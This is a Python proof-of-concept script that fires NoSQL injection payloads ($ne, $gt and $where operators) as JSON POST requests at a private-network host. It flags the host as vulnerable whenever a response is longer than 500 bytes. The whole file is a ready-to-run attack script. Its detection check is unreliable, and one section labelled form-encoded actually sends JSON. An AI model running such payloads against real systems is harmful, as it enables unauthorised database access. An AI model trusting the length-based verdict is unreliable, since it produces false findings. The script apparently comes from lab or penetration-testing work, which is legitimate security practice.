#!/usr/bin/env python3
"""
PoC for NoSQL Injection on 192.168.64.4
Vulnerability: MongoDB/NoSQL queries vulnerable to injection attacks
"""
import urllib.request
import json

target = "http://192.168.64.4"

# NoSQL injection payloads from MCP analysis
payloads = [
    {"name": "$ne operator", "data": {"$ne": "123"}},
    {"name": "$gt operator", "data": {"$gt": ""}},
    {"name": "$where clause", "data": {"$where": "1==1"}},
    {"name": "$gt operator 2", "data": {"$gt": "x"}},
]

print("[+] NoSQL Injection PoC")
print(f"[*] Target: {target}")
print("-" * 60)

for payload in payloads:
    print(f"\n[*] Testing: {payload['name']}")
    
    try:
        # Try JSON POST
        post_data = json.dumps(payload['data']).encode('utf-8')
        req = urllib.request.Request(
            target,
            data=post_data,
            method='POST',
            headers={'Content-Type': 'application/json'}
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            content = response.read().decode('utf-8', errors='ignore')
            
            # Check for successful injection indicators
            is_vulnerable = len(content) > 500
            
            if is_vulnerable:
                print(f"   [!] VULNERABLE: {payload['name']}")
                print(f"   [!] Response length: {len(content)} bytes")
            else:
                print(f"   [-] Not vulnerable (short response)")
                
    except Exception as e:
        print(f"   [-] Error: {str(e)[:50]}")

print("\n[*] Testing with form-encoded data...")
try:
    post_data = b'{"$ne":"123"}'
    req = urllib.request.Request(
        target,
        data=post_data,
        method='POST',
        headers={'Content-Type': 'application/json'}
    )
    
    with urllib.request.urlopen(req, timeout=10) as response:
        content = response.read().decode('utf-8', errors='ignore')
        if len(content) > 500:
            print("   [!] VULNERABLE: JSON POST with $ne operator")
except Exception:
    pass

print("\n[+] NoSQL Injection PoC complete")
